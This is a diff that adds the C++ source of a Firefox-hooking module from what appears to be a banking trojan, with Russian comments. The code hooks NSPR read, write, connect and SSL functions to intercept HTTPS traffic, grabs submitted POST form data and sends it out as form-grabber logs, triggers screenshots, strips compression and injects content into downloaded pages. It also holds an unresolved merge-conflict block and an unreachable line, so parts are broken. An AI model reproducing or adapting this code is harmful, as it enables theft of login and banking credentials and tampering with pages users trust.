@@ -1,0 +1,900 @@
+#include <windows.h>
+
+#include "GetApi.h"
+#include "Memory.h"
+#include "Strings.h"
+#include "Utils.h"
+#include "Exploit.h"
+#include "Splice.h"
+#include "Unhook.h"
+#include "Loader.h"
+#include "BotConfig.h"
+#include "Screens.h"
+#include "Requests.h"
+#include "BotHTTP.h"
+#include "BotClasses.h"
+#include "Firefox.h"
+
+#include <nss/ssl.h>
+#include <nspr/prio.h>
+#include <nspr/prnetdb.h>
+#include <nspr/prlog.h>
+#include <nspr/prerror.h>
+#include <nspr/prprf.h>
+#include <nspr/prinit.h>
+
+#include <nspr/prtypes.h>
+
+// Зарезервируем имя для объявления функций nspr4 апи
+#define NSPR_API
+
+
+// Для избежания затрат процесорного времени при поиске функций в загруженных
+// библиотеках кешируем найденные результаты
+const DWORD ApiCasheSize = 5;
+LPVOID ApiCashe[ApiCasheSize] = {NULL};
+
+bool InitMozillaApiCashe()
+{
+	// Инициализировать кэш апи
+	m_memset(&ApiCashe, 0, ApiCasheSize * sizeof(DWORD));
+	return true;
+}
+
+/* Шаблоны для доступа к API */
+
+// Шаблон для инициализации функций без параметров
+template <DWORD ApiIndex, DWORD h, DWORD hash>
+inline LPVOID pushargEx2()
+{
+	typedef LPVOID (NSPR_API (*newfunc))();
+	newfunc func = (newfunc)ApiCashe[ApiIndex];
+	if (func == NULL)
+	{
+		func = (newfunc)GetProcAddressEx(NULL, h, hash);
+		ApiCashe[ApiIndex] = (LPVOID)func;
+	}
+	return func();
+}
+
+// Шаблон для инициализации функций с одним параметром
+template <DWORD ApiIndex, DWORD h, DWORD hash, class A>
+inline LPVOID pushargEx2(A a1)
+{
+	typedef LPVOID (NSPR_API *newfunc)(A);
+	newfunc func = (newfunc)ApiCashe[ApiIndex];
+	if (func == NULL)
+	{
+		func = (newfunc)GetProcAddressEx(NULL, h, hash);
+		ApiCashe[ApiIndex] = (LPVOID)func;
+	}
+	return func(a1);
+}
+
+// Шаблон для инициализации функций с двумя парaметрами
+template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B>
+inline LPVOID pushargEx2(A a1, B b1)
+{
+	typedef LPVOID (NSPR_API *newfunc)(A, B);
+	newfunc func = (newfunc)ApiCashe[ApiIndex];
+	if (func == NULL)
+	{
+		func = (newfunc)GetProcAddressEx(NULL, h, hash);
+		ApiCashe[ApiIndex] = (LPVOID)func;
+	}
+	return func(a1, b1);
+}
+
+// Шаблон для инициализации функций с тремя парaметрами
+template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B, class C>
+inline LPVOID pushargEx2(A a1, B b1, C c1)
+{
+	typedef LPVOID (NSPR_API *newfunc)(A, B, C);
+	newfunc func = (newfunc)ApiCashe[ApiIndex];
+	if (func == NULL)
+	{
+		func = (newfunc)GetProcAddressEx(NULL, h, hash);
+		ApiCashe[ApiIndex] = (LPVOID)func;
+	}
+	return func(a1, b1, c1);
+}
+
+// Шаблон для инициализации функций с пятью парaметрами
+template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B, class C, class D, class E>
+inline LPVOID pushargEx2(A a1, B b1, C c1, D d1, E e1)
+{
+	typedef LPVOID (NSPR_API *newfunc)(A, B, C, D, E);
+	newfunc func = (newfunc)ApiCashe[ApiIndex];
+	if (func == NULL)
+	{
+		func = (newfunc)GetProcAddressEx(NULL, h, hash);
+		ApiCashe[ApiIndex] = (LPVOID)func;
+	}
+	return func(a1, b1, c1, d1, e1);
+}
+
+// Описываем функции для работы с библиотекой Mozile FireFox;
+#define pPR_GetError				pushargEx2<0, 10, 0x1D3347F>
+#define pPR_MillisecondsToInterval	pushargEx2<1, 10, 0x5BF9111>
+#define pPR_Poll					pushargEx2<2, 10, 0xFA1AB4F9>
+#define pPR_SetError				pushargEx2<3, 10, 0x1FB347F>
+#define pPR_Recv     				pushargEx2<4, 10, 0xFA583363>
+
+//#define pPR_GetOSError				pushargEx<10,0xBEBFDE8D>
+//#define pPR_ErrorToName				pushargEx<10,0xE2C4D38>
+//#define pPR_Available				pushargEx<10,0xDDF2584>
+//#define pPR_GetConnectStatus		pushargEx<10,0xA4989C58>
+
+
+/* Описания констант */
+char HeaderContentLength[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};
+
+
+typedef PRInt32 (*PWRITE)( PRFileDesc *fd,const void *buf,PRInt32 amount ); 
+typedef PRInt32 (*PREAD)(PRFileDesc *fd, void *buf, PRInt32 amount);
+typedef PRStatus (*PCLOSE)( PRFileDesc *fd );
+typedef PRStatus (*PCONNECT)( PRFileDesc *fd, const PRNetAddr *addr, PRIntervalTime timeout );
+typedef PRFileDesc * (*PSSLIMPORTFD)( PRFileDesc *model, PRFileDesc *fd );
+
+PREAD		PR_ReadReal;
+PWRITE		PR_WriteReal;
+PCLOSE		PR_CloseReal;
+PCONNECT	PR_ConnectReal;
+PSSLIMPORTFD SSL_ImportFDReal;
+
+
+//     Глобальные данные
+
+//PREQUEST pStructHead;
+
+PRequestList FFRequests = NULL;
+PList HashList = NULL;
+PCHAR FFUserAgent;
+
+//-----------------------
+
+
+void InitFFGlobalData()
+{
+	InitMozillaApiCashe();
+	FFRequests = CreateRequestList(NULL, NULL);
+	HashList = ListCreate();
+	FFUserAgent = NULL;
+}
+
+
+
+
+LPDWORD dwHashPosts;
+DWORD dwHashCount;
+
+void AddHash(DWORD Hash)
+{
+	ListAdd(HashList, (LPVOID)Hash);
+}
+
+bool FindHash(DWORD Hash)
+{
+	return ListIndexOf(HashList, (LPVOID)Hash) >= 0;
+}
+
+//----------------------------------------------------------------------------
+
+bool FindInjectFF(PRequest Request)
+{
+
+	bool DelURL = false;
+	PCHAR URL = Request->URL;
+
+	if (Request->Optional != NULL)
+	{
+		URL = StrNew(3, URL, "?", Request->Optional);
+		if (URL == NULL)
+			return false;
+        DelURL = true;
+	}
+	bool Result = GetInjectFromConfig(URL, Request->Method, &Request->Injects, &Request->InjectsCount);\
+
+	if (DelURL)
+		StrFree(URL);
+
+	return Result;
+}
+
+void UpdateContentLength(PRequest Request)
+{
+	// Обновить длину контента
+	PCHAR Buf = (PCHAR)Request->Buffer;
+
+	// Определяем позицию вставки
+	int Pos = StrPos(Buf, ParamContentLength);
+	if (Pos < 0) return;
+	Pos += StrCalcLength(ParamContentLength);
+
+	// Определяем новый размер
+	Request->ContentLength = StrCalcLength(Buf + Request->HeaderSize);
+
+    PCHAR BufEnd = Buf + (Request->HeaderSize + Request->ContentLength);
+
+	// Создаём строку
+	PCHAR CLS = StrLongToString(Request->ContentLength);
+	PCHAR InLine = StrNew(2, ": ", CLS);
+	DWORD InLineLen = StrCalcLength(InLine);
+	StrFree(CLS);
+
+	// Определяем указатели на копируемые блоки
+	PCHAR AfterPtr = Buf + Pos;
+	while (*AfterPtr != 10 && *AfterPtr != 13) AfterPtr++;
+
+	// Определяем общий размер буфера
+	DWORD Len = Pos + InLineLen + (BufEnd - AfterPtr);
+
+	PCHAR NewBuf = (PCHAR)MemAlloc(Len + 1);
+	if (NewBuf == NULL) return;
+
+	// Копируем данные
+	PCHAR Tmp = NewBuf;
+
+	m_memcpy(Tmp, Buf, Pos);
+	Tmp += Pos;
+
+	m_memcpy(Tmp, InLine, InLineLen);
+	Tmp += InLineLen;
+	StrFree(InLine);
+
+	m_memcpy(Tmp, AfterPtr, BufEnd - AfterPtr);
+
+	*(NewBuf + Len) = 0;
+
+	// Устанавливаем новый буяер
+	SetRequestBuffer(Request, (LPBYTE)NewBuf, Len, false);
+
+<<<<<<< .mine
+	bool Result;// = SubstituteText(Buffer, 0, &NewBuffer, ParamName, NewContentLen, "\r\n") >= 0;
+	MemFree(ParamName);
+=======
+>>>>>>> .r95
+
+}
+//----------------------------------------------------------------------------
+
+bool InjectFF(PRequest Request)
+{
+	// Обрабатываем загруженные данные
+	if (Request == NULL || !Request->IsInject)
+		return false;
+
+	bool Changed = false;
+	PCHAR NewBuffer;
+
+	THTTPSessionInfo Session; // Описание сессии
+
+	Session.BrowserType = BROWSER_TYPE_FF;
+	Session.UserAgent = FFUserAgent;
+	Session.URL = Request->URL;
+
+    // перебираем все маски для загруженного сайта
+	for (DWORD i = 0; i < Request->InjectsCount; i++ )
+	{		
+        HandleHTML((PCHAR)Request->Buffer, NewBuffer, &Request->Injects[i], &Session);
+		if (NewBuffer != NULL)
+		{
+            Changed = true;
+			// Если в исходный код были внесены изменения то заменяем старый
+			// буфер на новый
+			SetRequestBuffer(Request, (LPBYTE)NewBuffer, 0, true);
+		}
+	}
+
+	// В случае изменения обновляем длину контента
+	if (Changed)
+		UpdateContentLength(Request);
+
+    Request->Injected = true;
+	return Changed;
+}
+
+bool SubstituteHeader( char *Header )
+{
+	char gzip_deflate[] = {'g','z','i','p',',','d','e','f','l','a','t','e',0};
+
+	DWORD dwStart = m_istrstr( Header, gzip_deflate );
+
+	if ( dwStart != (DWORD)-1 )
+	{
+		for ( DWORD i = 0; i < m_lstrlen( gzip_deflate ); i++ )
+		{
+			Header[ dwStart + i ] = ' ';
+		}
+	}
+
+	char Http[] = {'H','T','T','P','/','1','.',0};
+
+	DWORD dwHttp = m_istrstr( Header, Http );
+
+	if ( dwHttp != (DWORD)-1 )
+	{
+		Header[ dwHttp + m_lstrlen( Http ) ] = '0';
+		return true;
+	}
+
+	return false;
+}
+
+//----------------------------------------------------------------------------
+void UpdateFFUserAgent(PCHAR Request)
+{
+    // Получаем имя агента
+	if (FFUserAgent == NULL)
+    	FFUserAgent = GetHTTPHeaderValue(Request, ParamUserAgent);
+}
+
+//----------------------------------------------------------------------------
+
+bool ProcessPostData(PRequest Request)
+{
+	// Обработать POST данные
+
+	// Проверяем библиотеку ScreenShot
+	if ( CalcHash(Request->Optional) == 0x24DE3210 )
+	{
+		StartThread( ScreensThread, NULL );
+		return true;
+	}
+
+	// Проверяем не обрабатывали ли мы этот запрос
+	DWORD DataHash = CalcHash(Request->Optional);
+	if (FindHash(DataHash))
+		return true;
+
+	// Отправляем данные формы на сервер
+	PCHAR SendBuf = StrNew(3, Request->URL, "?|POST:", Request->Optional);
+	if (SendBuf == NULL)
+		return false;
+
+	bool Res = SendFormGrabberLogs(Request->URL, SendBuf, FFUserAgent, BROWSER_TYPE_FF, DATA_TYPE_FORMGRAB);
+	StrFree(SendBuf);
+
+	if (Res)
+        AddHash(DataHash);
+	return Res;
+}
+//----------------------------------------------------------------------------
+
+
+bool MakeInfo( PRequest Request, PCHAR buf, int len )
+{
+
+	// Собираем информацию об отправляемом запросе
+
+	PCHAR MethodName;
+	PCHAR Path;
+
+	DWORD ConentTypeHash = 0x6B3CDFEC;
+
+	if (ParseRequestFirstLine(buf, &MethodName, &Path, NULL))
+	{
+		ClearRequest(Request);
+
+		UpdateFFUserAgent(buf);
+
+		// Разбираем тип запроса
+		Request->MethodID = GetMethodFromStr(MethodName);
+		Request->Method = MethodName;
+
+		if (Request->MethodID != hmGET && Request->MethodID != hmPOST)
+		{
+			StrFree(MethodName);
+			StrFree(Path);
+			return false;
+		}
+
+		// Собираем URL
+		PCHAR Host = GetHTTPHeaderValue(buf, ParamHost);
+
+		PCHAR Protocol = ProtocolHTTP;
+		if (Request->HTTPS) Protocol = ProtocolHTTPS;
+
+		Request->URL = StrNew(5, Protocol, "://", Host, "/", Path);
+		StrFree(Path);
+		StrFree(Host);
+		if (Request->URL == NULL) return false;
+
+		if (Request->MethodID == hmGET)
+			return true;
+
+		// Подготавливаем запрос к перехвату пост данных
+		Request->SupportPostData = true;
+
+
+		if (StrPos(buf, LineBreak2) < 0 )
+			return false;  // В заголовке нет пост данных
+
+
+		// Проверяем тип контента
+		PCHAR CT = GetHTTPHeaderValue(buf, ParamContentType);
+		DWORD Hash = CalcHash(CT);
+		StrFree(CT);
+		if (Hash != ConentTypeHash) /* url_encoded*/
+		{
+			Request->SupportPostData = false;
+			return true;
+		}
+
+        Request->Optional = GetURLEncodedPostData(buf);
+
+		if (Request->Optional != NULL)
+		{
+			// запрос содержит пост данные, обрабатываем их
+			ProcessPostData(Request);
+			return true;
+        }
+	}
+	else
+	if (Request->MethodID == hmPOST && Request->SupportPostData)
+	{
+		// Проверяем POST данные
+
+        bool RequestEnd = StrPos(buf, LineBreak2) >= 0; // Признак наличия окончания запроса
+
+        // Проверяем тип контента
+		PCHAR CT = GetHTTPHeaderValue(buf, ParamContentType);
+		if (CT != NULL)
+		{
+			DWORD Hash = CalcHash(CT);
+			StrFree(CT);
+			if (Hash != ConentTypeHash) /* url_encoded*/
+			{
+                Request->SupportPostData = false;
+				return true;
+			}
+		}
+
+		if (Request->Flags != 0)
+		{
+			Request->Optional = StrNew(buf, len);
+			ProcessPostData(Request);
+			return true;
+		}
+		else
+		{
+			// Наличие признака окончания запроса означает, что браузер
+			// полностью вызал заголовок и следующей записью будут
+			// выданы пост данные
+			if (RequestEnd)
+				Request->Flags = 1;
+        }
+	}
+	return false;
+}
+//---------------------------------------------------------------------------
+
+
+ /*
+
+#include "TestMain.h"
+#include "SysUtils.hpp"
+
+PRequest First = NULL;
+int Total = 0;
+
+void ShowLine(PRFileDesc *fd, PRequest Request, AnsiString Prefix, AnsiString Line)
+{
+	AnsiString S = Prefix;
+	S = S + "Fd(" + IntToHex((int)fd, 4) + ") Rq(" + IntToHex((int)Request, 4) + ") " + Line;
+	TestBot->ListBox1->Items->Add(S);
+}
+
+void ShowBytes(PRequest Request, PRFileDesc *fd, int Bytes)
+{
+	if (Request == NULL)
+		return;
+//	First = Request;
+//	LockRequestList(FFRequests);
+	if(Bytes > 0)
+	{
+		Total += Bytes;
+		TestBot->Caption = IntToStr(Total);
+	}
+	ShowLine(fd, Request, "", IntToStr(Bytes));
+ //	UnlockRequestList(FFRequests);
+}
+    */
+//---------------------------------------------------------------------------
+
+bool WaitPool(PRFileDesc *FD)
+{
+	// Функция будет ожидать пока производится запись в пул
+	PRErrorCode Error = (PRErrorCode)pPR_GetError();
+	if ( Error != PR_WOULD_BLOCK_ERROR )
+		return false;
+
+    bool Result = false;
+	PRInt32 npoll;
+	PRIntervalTime delay = (PRIntervalTime)pPR_MillisecondsToInterval(30);
+
+	PRPollDesc *pfd = CreateStruct(PRPollDesc);
+
+	pfd->fd		 = FD;
+	pfd->out_flags = 0;
+	pfd->in_flags  = PR_POLL_READ;
+
+	npoll = (PRInt32)pPR_Poll(pfd, 1, delay );
+	PRInt32 OutFlags = pfd ->out_flags;
+
+	if (npoll > 0)
+	{
+		if (OutFlags & PR_POLL_READ )
+			Result = true;
+	}
+
+	FreeStruct(pfd);
+    return Result;
+
+}
+//---------------------------------------------------------------------------
+
+bool IsHTTPHeader(PCHAR HTML)
+{
+	// Функция возвращает истину если HTML код начинается с HTTP заголовка
+	return  StrSame(HTML, "HTTP/1.", false, 7);
+}
+
+
+//---------------------------------------------------------------------------
+bool ProcessFFResponseHeaders(PRequest Request, PCHAR Buffer, int BufferSize, PReceiveBuf List)
+{
+	// Функция обрабатывает загруженный заголовок
+	PCHAR Buf = Buffer;
+	int Size = BufferSize;
+
+	// Объеденяем загруженные части в обну
+	if (ListGetCount((PList)List) > 1)
+	{
+		Buf = (PCHAR)BuildReceiveData(List, Size);
+		ListClear((PList)List);
+		AddReceiveData(List, Buf, Size, false);
+    }
+
+	// Проверяем тип контекста
+	Request->ContentType = GetHTTPHeaderValue(Buf, ParamContentType);
+	if (Request->ContentType != NULL && !SupportContentType(Request->ContentType))
+	{
+		Request->IsInject = false;
+		return true;
+	}
+
+	// Определяем длину контента
+	PCHAR CL = GetHTTPHeaderValue(Buf, ParamContentLength);
+	if (CL != NULL)
+		Request->ContentLength = StrToInt(CL);
+	StrFree(CL);
+	// Для инжекта допускаем только страницы с положительной длиной контента
+//	if (Request->ContentLength == 0)
+//		Request->IsInject = false;
+	if (Request->IsInject)
+		Request->HeaderSize = StrPos(Buf, LineBreak2) + 4;
+
+	return true;
+}
+
+//---------------------------------------------------------------------------
+
+DWORD MyReadRoutine(PRequest Request)
+{
+	// Ситаем следующий файл
+    PReceiveBuf List = CreateReceiveBuf();
+	DWORD BufSize = 4096;
+	DWORD Readed = 0;
+	bool CTHandled = false;
+	PRFileDesc *FD = (PRFileDesc *)Request->Owner;
+
+	LPVOID Buf = MemAlloc(BufSize);
+	if (Buf == NULL)
+		return -1;
+
+	bool First = true;
+
+	PRInt32 Bytes = 0;
+
+	do
+	{
+		// Читаем следующую порцию данных
+		Bytes = (PRInt32)PR_ReadReal(FD, Buf, BufSize);
+
+		if (Bytes > 0 )
+		{
+			Request->LastReadTime = (DWORD)pGetTickCount();
+
+			if (Readed == 0)
+			{
+				// При чтении первой порции добавляем в список старый буфер
+				// и проверяем заголовок ли это
+				if (Request->Buffer != NULL)
+				{
+					AddReceiveData(List, Request->Buffer, Request->BufferSize, false);
+					Request->Buffer = NULL;
+				}
+			}
+
+			// Успешно прочитали порцию данных
+			Readed += Bytes;
+			AddReceiveData(List, Buf, Bytes);
+
+			// Обрабатываем заголовок ответа сервера
+			if (!Request->HeaderHandled && StrPos((PCHAR)Buf, LineBreak2) >= 0)
+			{
+				Request->HeaderHandled = ProcessFFResponseHeaders(Request, (PCHAR)Buf, Bytes, List);
+				if (!Request->IsInject)
+					break;
+			}
+
+			// Продолжаем загрузку
+			continue;
+		}
+
+		// Если все данные сокетов прочитаны
+		if (Bytes == 0) break;
+
+        if ( Bytes == -1 )
+		{
+			// Проверяем не ситаются ли данные в пул
+			if(!WaitPool(FD))
+				break;
+		}
+
+	}
+	while (1);
+
+	MemFree(Buf);
+
+	if (Bytes == 0)
+		Request->FileReaded = true;
+
+	// Собираем загруженные данные
+	if (Readed > 0)
+	{
+		int ResultSize = 0;
+		LPBYTE ResultBuf = BuildReceiveData(List, ResultSize);
+		SetRequestBuffer(Request, ResultBuf, ResultSize, true);
+	}
+	FreeReceiveBuf(List);
+
+	return Readed;
+}
+//---------------------------------------------------------------------------
+
+PRInt32 FFInjectedRead(PRequest Request, void* buf, PRInt32 amount)
+{
+	// Читаем следующий блок данных
+	int Bytes = 0;
+    bool IsHeader = false;
+
+	// Читаем порцию данных
+
+	MyReadRoutine(Request);
+
+	// В случае если  во время загрузки обнаружилось, что
+	// тип файла не поддерживается инжектом, выдаём порцию
+	// данныхх и прекращаем обработку
+	if (!Request->IsInject)
+		return GetNextDataPart(Request, buf, amount, true);
+
+	// Проверяем длину загруженных данных. Страница пойдёт в обработку только
+	// после того как будет полностью загружена
+	if (!Request->FileReaded )
+	{
+		if (Request->ContentLength != 0)
+			Request->FileReaded = (Request->BufferSize >= Request->HeaderSize + Request->ContentLength);
+
+		if (!Request->FileReaded)
+		{
+			// Если в течении заданного интервала небыло чтения данных
+			// то помечаем страницу как прочитанную
+			int Interval = (DWORD)pGetTickCount() - Request->LastReadTime;
+			if (Interval > 50000) // больше пяти секунд
+				Request->FileReaded = true;
+		}
+
+		if (!Request->FileReaded)
+			return -1;
+	}
+
+	// Инжектим данные в загруженный документ
+	if (Request->FileReaded && !Request->Injected)
+		InjectFF(Request);
+
+	// Выдаём следующий блок данных
+	Bytes = GetNextDataPart(Request, buf, amount, true);
+	if (Bytes == 0)
+		return  -1;
+
+	return Bytes;
+}
+//-----------------------------------------------------------------------------
+
+PRInt32 PR_ReadHook( PRFileDesc *fd, void* buf, PRInt32 amount )
+{
+
+	PRequest Request = FindRequest(FFRequests, fd);
+
+	int Bytes;
+
+	// Вызываем оригинальный метод чтения
+	if ( Request == NULL  || !Request->IsInject)
+	{
+		// Возможна ситуация когда запрос помечен ка запрос не поддерживающий
+		// инжекты, но содержит некоторые загруженные данные
+		if (Request != NULL && Request->Buffer != NULL)
+		{
+			Bytes = GetNextDataPart(Request, buf, amount, true);
+			if (Bytes > 0)
+				return Bytes;
+		}
+
+		Bytes = PR_ReadReal(fd, buf, amount);
+    }
+	else
+		Bytes = FFInjectedRead(Request, buf, amount);
+
+	//ShowBytes(Request, fd, Bytes);
+	return Bytes;
+
+}
+//---------------------------------------------------------------------------
+
+PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
+{
+	//  Метод отправки данных на сервер
+	PRequest Request = FindRequest(FFRequests, fd);
+
+	if ( Request != NULL )
+	{
+		if (MakeInfo(Request, (PCHAR)buf, (int)amount ) )
+		{
+			if ( FindInjectFF(Request))
+			{
+				if ( SubstituteHeader( (PCHAR)buf ) )
+					Request->IsInject   = true;;
+			}
+		}
+	}
+
+	return PR_WriteReal(fd, buf, amount );
+}
+//---------------------------------------------------------------------------
+
+
+PRStatus PR_CloseHook( PRFileDesc *fd )
+{
+	return PR_CloseReal( fd );
+	DeleteRequest(FFRequests, fd);
+}
+
+PRStatus PR_ConnectHook( PRFileDesc *fd, const PRNetAddr *addr, PRIntervalTime timeout )
+{
+	AddRequest(FFRequests, fd);
+
+	return PR_ConnectReal( fd, addr, timeout );
+}
+
+
+PRFileDesc * SSL_ImportFDHook( PRFileDesc *model, PRFileDesc *fd )
+{
+	PRFileDesc *SslFd = SSL_ImportFDReal(model, fd);
+
+	if ( SslFd != NULL )
+	{
+		PRequest Request = AddRequest(FFRequests, SslFd);
+
+		if ( Request != NULL )
+			Request->HTTPS = true;
+	}
+
+	return SslFd;
+}
+
+
+bool WINAPI CheckInCurrentDir( WCHAR *File )
+{
+	WCHAR *Directory = (WCHAR*)MemAlloc( 512 );
+
+	if ( Directory == NULL )
+	{
+		return false;
+	}
+
+	pGetModuleFileNameW( (HMODULE)pGetModuleHandleW( NULL ), Directory, 255 );
+
+	for ( DWORD i = m_wcslen( Directory ) - 1; i > 0; i-- )
+	{
+		if ( Directory[i] == '\\' )
+		{
+			Directory[i + 1] = '\0';
+			break;
+		}
+	}
+
+	plstrcatW( Directory, File );
+
+	if ( (DWORD)pGetFileAttributesW( Directory ) != INVALID_FILE_ATTRIBUTES )
+	{
+		MemFree( Directory );
+		return true;
+	}
+
+	MemFree( Directory );
+	return false;
+}
+
+
+bool HookMozillaFirefox()
+{
+	WCHAR nspr4[] = {'n','s','p','r','4','.','d','l','l',0};
+	WCHAR ssl3[]  = {'s','s','l','3','.','d','l','l', 0 };
+
+	if (CheckInCurrentDir( nspr4 ) && CheckInCurrentDir( ssl3 ) )
+	{
+		//UnhookFF();
+		InitializeConfig();
+		InitScreenLib();
+
+		return HookMozillaApi();
+	}
+
+	return false;
+}
+
+bool HookMozillaApi()
+{
+	InitFFGlobalData();
+
+	dwHashPosts = NULL;
+	dwHashCount = 0;
+
+	DWORD PR_WriteHash	   = 0x7EFB3098;
+	DWORD PR_ReadHash	   = 0xFA583271;
+	DWORD PR_CloseHash	   = 0x3D3AB319;
+	DWORD PR_ConnectHash   = 0xBF667EA2;
+	DWORD SSL_ImportFDHash = 0xA1C4E024;
+
+
+	if ( HookApi( 10, PR_ConnectHash, (DWORD)&PR_ConnectHook ) )
+	{
+	   __asm mov [ PR_ConnectReal ], eax
+	}
+	else
+		return false;
+
+	if ( HookApi( 10, PR_WriteHash, (DWORD)&PR_WriteHook ) )
+	{
+		__asm mov [ PR_WriteReal ], eax
+	}
+	else
+		return false;
+
+
+	if ( HookApi( 10, PR_ReadHash, (DWORD)&PR_ReadHook ) )
+	{
+		__asm mov [ PR_ReadReal ], eax
+	}
+	else
+		return false;
+
+	if ( HookApi( 10, PR_CloseHash, (DWORD)&PR_CloseHook ) )
+	{
+	   __asm mov [ PR_CloseReal ], eax
+	}
+	else
+		return false;
+
+	if ( HookApi( 11, SSL_ImportFDHash, (DWORD)&SSL_ImportFDHook ) )
+	{
+	   __asm mov [ SSL_ImportFDReal ], eax
+	}
+	else
+		return false;
+
+	return true;
+}
+
